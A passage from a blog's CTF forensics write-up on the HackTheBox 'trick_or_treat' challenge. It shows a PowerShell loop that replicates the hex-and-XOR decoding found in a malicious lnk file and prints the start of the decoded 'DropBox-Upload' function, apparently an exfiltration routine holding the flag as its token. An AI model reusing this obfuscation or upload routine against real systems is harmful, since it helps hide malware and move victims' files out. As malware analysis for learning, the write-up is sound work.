+<p>After spending some time trying to reverse the encoding steps listed from our <code>lnk</code> file, I wasn&rsquo;t getting a reasonable answer. Those with a sharp eye, however, might have noticed right away that this data chunk is being sent from the target, to our victim. Meaning, the decoding actions done in the <code>lnk</code> file <em>is</em> the way to decode. Instead of reversing the steps, we just need to replicate them. In powershell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Flare</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">forensics_trick_or_treat</span><span class="p">\</span><span class="n">trick_or_treat</span><span class="p">&gt;</span> <span class="nv">$boddmei</span> <span class="p">=</span> <span class="s2">&#34;7b68737e697472733d596f726d5f726530486d71727c793d661717465e70797178695f7473797473&lt;...SNIP...&gt;7c791760&#34;</span><span class="p">;</span><span class="nv">$vurnwos</span> <span class="p">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="mf">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">-le</span> <span class="nv">$boddmei</span><span class="p">.</span><span class="n">Length</span><span class="p">-</span><span class="mf">2</span><span class="p">;</span><span class="nv">$i</span><span class="p">=</span><span class="nv">$i</span><span class="p">+</span><span class="mf">2</span><span class="p">){</span><span class="nv">$bodms</span><span class="p">=</span><span class="nv">$boddmei</span><span class="p">[</span><span class="nv">$i</span><span class="p">]+</span><span class="nv">$boddmei</span><span class="p">[</span><span class="nv">$i</span><span class="p">+</span><span class="mf">1</span><span class="p">];</span><span class="nv">$decodedChar</span> <span class="p">=</span> <span class="p">[</span><span class="no">char</span><span class="p">]([</span><span class="no">convert</span><span class="p">]::</span><span class="n">ToInt16</span><span class="p">(</span><span class="nv">$bodms</span><span class="p">,</span> <span class="mf">16</span><span class="p">));</span><span class="nv">$xoredChar</span><span class="p">=[</span><span class="no">char</span><span class="p">]([</span><span class="no">byte</span><span class="p">](</span><span class="nv">$decodedChar</span><span class="p">)</span> <span class="o">-bxor</span> <span class="n">0x1d</span><span class="p">);</span><span class="nv">$vurnwos</span> <span class="p">=</span> <span class="nv">$vurnwos</span> <span class="p">+</span> <span class="nv">$xoredChar</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Flare</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">forensics_trick_or_treat</span><span class="p">\</span><span class="n">trick_or_treat</span><span class="p">&gt;</span> <span class="nb">echo </span><span class="nv">$vurnwos</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">DropBox-Upload</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nb">CmdletBinding</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl"><span class="k">param</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nb">Parameter</span> <span class="p">(</span><span class="na">Mandatory</span> <span class="p">=</span> <span class="vm">$True</span><span class="p">,</span> <span class="na">ValueFromPipeline</span> <span class="p">=</span> <span class="vm">$True</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nb">Alias</span><span class="p">(</span><span class="s2">&#34;f&#34;</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">string</span><span class="p">]</span><span class="nv">$SourceFilePath</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$DropBoxAccessToken</span> <span class="p">=</span> <span class="s2">&#34;HTB{s4y_Pumpk1111111n!!!}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$outputFile</span> <span class="p">=</span> <span class="nb">Split-Path</span> <span class="nv">$SourceFilePath</span> <span class="n">-leaf</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When we echo the decoded <code>$vurnwos</code>, the message is properly decoded!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/forensics/">Forensics</a>
+        
+            <a href="/tags/csrf/">CSRF</a>
+        
+            <a href="/tags/ssti/">SSTI</a>
+        
+            <a href="/tags/wireshark/">Wireshark</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/huntress-ctf-2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/huntress-ctf-2024/HuntressCTF_Banner.6181f047aa18073aac2b72b3a0aa3ba2_hu2497031440356620825.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Huntress CTF 2024"
+                        
+                        data-hash="md5-YYHwR6oYBzqsK3KzoKo7og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Huntress CTF 2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-cyber-apocalypse-2024/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.d1ff26ab7326bd1a79b6d1e0a52f6aa6_hu13886050347455417942.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Cyber Apocalypse: 2024"
+                        
+                        data-hash="md5-0f8mq3MmvRp5ttHgpS9qpg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Cyber Apocalypse: 2024</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/picoctf_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PicoCTF_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hackthebox_cyber_apocalypse_2023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox_Cyber_Apocalypse_2023</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1337up-ctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1337UP CTF</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
